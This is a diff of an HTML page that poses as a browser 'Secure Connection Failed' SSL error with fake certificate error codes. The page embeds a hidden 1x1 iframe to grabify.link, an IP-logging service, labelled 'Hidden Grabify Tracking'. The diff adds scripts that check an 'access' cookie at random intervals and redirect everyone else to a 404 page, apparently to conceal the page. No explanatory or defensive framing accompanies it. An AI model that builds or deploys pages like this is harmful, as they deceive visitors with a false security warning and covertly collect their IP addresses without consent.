@@ -1,20 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠ Secure Connection Failed</title>
 
-    <!-- Google Analytics Tracking -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RYY2PDT1RB"></script>
-    <script>
+<html lang="en">
+<head><script>(function () {
+  const cookies = document.cookie.split("; ").map(c => c.trim());
+  const accessCookie = cookies.find(c => c.startsWith("access="));
+  const accessValue = accessCookie ? accessCookie.split("=")[1] : null;
+  if (accessValue !== "1") {
+    window.location.replace("/404.html");
+  }
+})();</script>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>⚠ Secure Connection Failed</title>
+<!-- Google Analytics Tracking -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-RYY2PDT1RB"></script>
+<script>
       window.dataLayer = window.dataLayer || [];
       function gtag(){dataLayer.push(arguments);}
       gtag('js', new Date());
       gtag('config', 'G-RYY2PDT1RB');
     </script>
-
-    <style>
+<style>
         @keyframes glitch {
             0% { transform: translateX(0); }
             20% { transform: translateX(-2px); }
@@ -66,8 +72,7 @@
             animation: glitch 2s infinite;
         }
     </style>
-
-    <script>
+<script>
         function checkAccess() {
             const cookies = document.cookie.split("; ");
             const accessCookie = cookies.find(row => row.startsWith("access="));
@@ -86,24 +91,39 @@
             checkAccess();
         };
     </script>
-</head>
+<script>function checkCookie() {
+  const cookies = document.cookie.split("; ").map(c => c.trim());
+  const accessCookie = cookies.find(c => c.startsWith("access="));
+  const accessValue = accessCookie ? accessCookie.split("=")[1] : null;
+  if (accessValue !== "1") {
+    window.location.replace("/404.html");
+  }
+}
+
+function scheduleNextCheck() {
+  const next = Math.floor(Math.random() * (25000 - 10000 + 1)) + 10000;
+  setTimeout(() => {
+    checkCookie();
+    scheduleNextCheck();
+  }, next);
+}
+
+checkCookie();
+scheduleNextCheck();</script></head>
 <body>
-    <div class="container">
-        <h1 class="glitch-text">⚠ Secure Connection Failed</h1>
-        <p>The website's SSL certificate could not be validated.</p>
-        <code>
-            ERR_CERT_COMMON_NAME_INVALID<br>
-            ERR_SSL_VERSION_OR_CIPHER_MISMATCH<br>
-            CERTIFICATE DATE INVALID<br>
-        </code>
-        <p style="color: #ff9999;">The site may be misconfigured or an attacker might be intercepting your connection.</p>
-        <p>Please contact your administrator or try again later.</p>
-    </div>
-
-    <!-- Hidden Grabify Tracking -->
-    <iframe src="https://grabify.link/9B53TJ" width="1" height="1" style="border:none;" class="hidden"></iframe>
-
+<div class="container">
+<h1 class="glitch-text">⚠ Secure Connection Failed</h1>
+<p>The website's SSL certificate could not be validated.</p>
+<code>
+            ERR_CERT_COMMON_NAME_INVALID<br/>
+            ERR_SSL_VERSION_OR_CIPHER_MISMATCH<br/>
+            CERTIFICATE DATE INVALID<br/>
+</code>
+<p style="color: #ff9999;">The site may be misconfigured or an attacker might be intercepting your connection.</p>
+<p>Please contact your administrator or try again later.</p>
+</div>
+<!-- Hidden Grabify Tracking -->
+<iframe class="hidden" height="1" src="https://grabify.link/9B53TJ" style="border:none;" width="1"></iframe>
 <script src="/analytics.js?5h"></script>
-
 </body>
 </html>
